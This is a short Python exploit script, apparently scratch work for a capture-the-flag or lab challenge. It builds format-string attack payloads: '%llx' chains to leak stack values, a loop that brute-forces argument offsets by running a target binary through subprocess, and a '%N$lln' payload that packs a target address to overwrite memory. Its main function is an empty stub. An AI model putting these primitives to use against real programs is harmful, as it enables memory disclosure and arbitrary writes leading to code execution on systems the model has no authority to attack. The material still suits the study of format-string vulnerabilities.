#!/usr/bin/env python

from __future__ import print_function
from functools import partial
import subprocess as sp
import struct as s


p = partial(print, end="")
p64 = partial(s.pack, "<Q")
p32 = partial(s.pack, "<I")


def param_enum(n):
    pld = "a" * 8
    pld += " "
    pld += " ".join(["%llx"] * n)

    return pld


def write_64(s):
    pass


def payload_1(n):
    pld = "a" * 8
    pld += " "
    # pld += " ".join(["%llx"] * 11)
    pld += "%%%i$llx" % n

    return pld


def param_bf(s, n):
    for i in range(1, n):
        sp.call(["%s" % s, payload_1(i)])
        print("\ni=%i" % i)


def payload_2(i):
    pld = p64(0x6161616161616161)
    # pld = p64(0x600e18)
    # pld += "%%0%ix"
    pld += "%%%i$lln" % i

    return pld


def a0(n):
    p(param_enum(n))


def a1(n):
    p(payload_1(n))


def a2(n):
    p(payload_2(n))


def main():
    pass


if __name__ == '__main__':
    main()
